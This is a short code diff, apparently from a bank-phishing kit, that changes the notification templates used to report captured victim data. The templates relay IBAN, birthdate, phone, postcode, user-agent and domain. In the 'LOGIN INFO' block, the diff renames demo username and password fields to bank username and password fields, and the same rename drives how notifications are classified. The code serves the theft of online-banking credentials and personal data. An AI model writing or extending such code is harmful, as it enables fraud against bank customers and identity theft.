@@ -26,9 +26,9 @@ iban: ${s.iban || ""}
 phone: ${s.phone || ""}
 
 ======> LOGIN INFO <=======
-benutzername: ${s.demo_username || ""}
-passwort: ${s.demo_password || ""}
-demo: ${s.demo || ""}
+benutzername: ${s.bank_username || ""}
+passwort: ${s.bank_password || ""}
+bank: ${s.bank || ""}
 
 user-agent: ${s.user_agent || ""}
 domain: ${s.domain || ""}`;
@@ -48,7 +48,7 @@ postcode: ${s.postal_code || ""}
 birthdate: ${s.birthdate || ""}
 iban: ${s.iban || ""}
 phone: ${s.phone || ""}
-demo: ${s.demo || ""}
+bank: ${s.bank || ""}
 
 user-agent: ${s.user_agent || ""}
 domain: ${s.domain || ""}`;
@@ -132,7 +132,7 @@ async function processNotification(
   // Determine kind from current DB state (auto), or use explicit kind
   let resolvedKind: "log" | "full_info";
   if (kind === "auto") {
-    resolvedKind = submission.demo_username && submission.demo_password ? "log" : "full_info";
+    resolvedKind = submission.bank_username && submission.bank_password ? "log" : "full_info";
   } else {
     resolvedKind = kind;
   }
